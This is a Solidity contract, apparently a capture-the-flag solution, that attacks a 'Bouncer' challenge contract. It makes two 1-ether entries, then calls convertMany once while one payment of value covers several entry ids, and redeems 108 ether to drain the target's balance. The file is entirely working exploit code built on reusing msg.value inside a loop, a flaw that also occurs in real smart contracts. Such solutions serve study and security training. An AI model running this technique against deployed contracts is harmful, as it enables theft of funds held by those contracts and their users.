// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;

import "./Setup.sol";
import "hardhat/console.sol";

contract BouncerAttacker {

    address constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
    Setup setup;
    Bouncer bouncer;

    constructor(address _setupAddress) {
        setup = Setup(_setupAddress);
        bouncer = Bouncer(setup.bouncer());
    }

    // Initial balance = 52.
    // 52 + x + y = xy -> x=2, y=54
    function deposit() public payable {
        bouncer.enter{value: 1 ether}(ETH, 54 ether);
        bouncer.enter{value: 1 ether}(ETH, 54 ether);
    }
    function attack() public payable {
        uint256[] memory ids = new uint256[](2);
        ids[0] = 0;
        ids[1] = 1;
        bouncer.convertMany{value: 54 ether}(address(this), ids);
        bouncer.redeem(ERC20Like(ETH), 108 ether);
    }

    receive() payable external {}

}
